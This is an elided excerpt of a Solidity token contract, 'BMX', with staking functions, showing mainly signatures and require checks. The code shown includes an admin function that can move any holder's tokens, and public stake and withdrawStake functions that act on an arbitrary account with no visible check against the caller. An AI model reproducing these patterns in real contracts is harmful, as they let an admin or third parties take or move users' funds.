...
contract BMX is Ownable, Stakeable{
  ...
  */
	constructor(string memory token_name, string memory short_symbol, uint8 token_decimals, uint256 token_totalSupply, address token_adminAccount){
		_name = token_name;
  ...
  */
	function _burn(address account, uint256 amount) internal {
		...
		require(_balances[account] >= amount, "BMX: Cannot burn more than the account owns");
  ...
  *
   */
	...
	function adminTransfer(address sender, address recipient, uint256 amount)external returns (bool) {
		require(msg.sender == _adminAccount, "BMX: only admin account can make this transfer");
  ...
  *  - sender balance most be = or bigger than amount
   */
	function _transfer(address sender, address recipient, uint256 amount) internal {
		...
		require(_balances[sender] >= amount, "BMX: cant transfer more than your account holds");
   ...
   *   - owner and spender cannot be zero address
    */
	function _approve(address owner, address spender, uint256 amount) internal {
		require(owner != address(0), "BMX: approve cannot be done from zero address");
		require(spender != address(0), "BMX: approve cannot be to zero address");
    ...
    *   - The caller must have a allowance = or bigger than the amount spending
	...
	function transferFrom(address spender, address recipient, uint256 amount) external returns(bool){
		...
		require(_allowances[spender][msg.sender] >= amount, "BMX: You cannot spend that much on this account");
		// Transfer first
   ...
   */
	...
	*
	...
	function stake(uint256 _amount,address account) public {
		...
		require(_amount < _balances[account], "BMX: Cannot stake more than you own");
	...
	* @notice withdrawStake is used to withdraw stakes from the account holder
	...
	function withdrawStake(address account, uint256 amount)  public {
		...
		StakingSummary memory summary = StakingSummary(0, stakeholders[stakes[account]].address_stakes);
		// Itterate all stakes and grab amount of stakes
		for (uint256 s = 0; s < summary.stakes.length; s += 1){
			uint256 availableReward = calculateStakeReward(summary.stakes[s]);
			summary.stakes[s].claimable = availableReward;
			uint256 amount_to_mint = _withdrawStake(summary.stakes[s].amount, s,account);
